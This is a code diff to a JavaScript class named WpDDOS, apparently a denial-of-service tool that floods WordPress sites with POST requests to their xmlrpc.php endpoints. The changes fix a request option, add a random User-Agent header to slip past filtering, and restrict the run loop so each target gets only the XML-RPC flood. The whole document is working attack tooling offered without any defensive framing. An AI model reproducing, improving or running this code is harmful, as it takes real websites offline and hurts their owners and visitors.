@@ -53,10 +53,11 @@ class WpDDOS {
         let randStr = Math.random().toString(36).substring(7);
         let fullUrl = url + 'xmlrpc.php';
         let options = {
-            uri: fullUrl,
+            url: fullUrl,
             method: 'POST',
             headers: {
-                'content-type': 'application/xml'
+                'content-type': 'application/xml',
+                'User-Agent': randStr
             },
             body: `
             <?xml version="1.0" encoding="utf-8"?>
@@ -83,8 +84,8 @@ class WpDDOS {
     runAll() {
         let urls = this.urls;
         for (let i in urls) {
-            this.getHomePage(urls[i]);
-            this.getRandomWp(urls[i]);
+            //this.getHomePage(urls[i]);
+            //this.getRandomWp(urls[i]);
             this.postRandomXmlRpc(urls[i]);
         }
 
